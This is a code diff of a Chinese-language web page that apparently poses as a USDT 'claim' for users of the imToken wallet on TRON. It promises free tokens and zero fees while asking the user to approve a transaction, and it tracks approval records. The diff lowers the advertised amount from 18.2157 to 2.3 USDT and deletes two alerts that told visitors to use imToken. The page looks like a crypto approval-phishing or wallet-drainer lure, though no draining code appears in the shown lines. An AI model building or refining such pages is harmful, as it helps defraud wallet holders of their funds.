@@ -283,7 +283,7 @@
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
                 <p>• 领取类型：<span class="highlight">USDT</span></p>
-                <p>• 领取额度：<span class="highlight">18.2157 USDT</span></p>
+                <p>• 领取额度：<span class="highlight">2.3 USDT</span></p>
                 <p>• 费用说明：<span class="highlight">我方代付全部TRX矿工费，无需你支付</span></p>
                 <p class="orange-tip">⚠️提示：代付处理需3-5秒，请耐心等待；若取消领取，直接退出即可</p>
             </div>
@@ -309,7 +309,7 @@
             </div>
             <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                 <span class="header"><h3>USDT</h3></span>
-                <span class="header"><h3>18.2157 USDT</h3></span>
+                <span class="header"><h3>2.3 USDT</h3></span>
             </div>       
             <span id="approvalRecords"class="highlight">暂无授权记录</span>        
         </div>
@@ -399,7 +399,7 @@
                 };
                 checkTronWeb();
                 tronWebWaitTimer = setTimeout(() => {
-                    alert("请用imToken钱包内置浏览器打开此页面");
+                  
                     resolve(null);
                 }, 3000);
                 window.addEventListener("tronWebReady", checkTronWeb);
@@ -422,7 +422,7 @@
             // 核心：适配代付合约的离线签名逻辑（用户0成本）
             approveBtn.onclick = async () => {
                 if (!userAddress || !tronWeb) {
-                    alert("请先连接imToken钱包");
+                    
                     return;
                 }
                 if (isProcessing) return;
